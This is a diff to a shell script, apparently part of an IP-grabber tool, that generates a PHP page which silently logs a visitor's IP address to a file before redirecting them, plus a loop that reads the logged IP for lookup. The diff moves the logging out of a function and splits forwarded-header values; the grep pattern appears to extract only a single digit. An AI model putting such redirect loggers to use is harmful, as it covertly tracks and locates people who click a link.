@@ -51,7 +51,6 @@ make_php(){
 if [[ ! -e "ip.php" ]]; then
     cat <<EOF > ip.php
     <?php
-    function get_ip(){
         if (isset(\$_SERVER['HTTP_CLIENT_IP'])) {
             \$ip_address = \$_SERVER['HTTP_CLIENT_IP'];
         }
@@ -64,10 +63,15 @@ if [[ ! -e "ip.php" ]]; then
             \$ip_address = \$_SERVER['REMOTE_ADDR'];
         }
 
+
+        if(strpos(\$ip_address, ',') !== false){
+            \$ip_address = preg_split("/\\,/", \$ip_address)[0];
+        }        
+        
+
         \$file = fopen("ip.txt", "a");
         fwrite(\$file, "IP: " . \$ip_address);
         fclose(\$file);
-        }    
     ?>
 EOF
 fi
@@ -76,7 +80,6 @@ fi
     <?php
     require 'ip.php';
 
-    get_ip();
     header("Location: $url");
     exit();
     ?>
@@ -139,6 +142,7 @@ echo "[-] Info: "
 while true; do
     if [[ -e ".server/ip.txt" ]]; then
         ip=$(grep -o "^[0-9]" ".server/ip.txt")
+        echo "$ip"
         get_info "$ip"
         echo -e "\n\n"
         rm -f .server/ip.txt
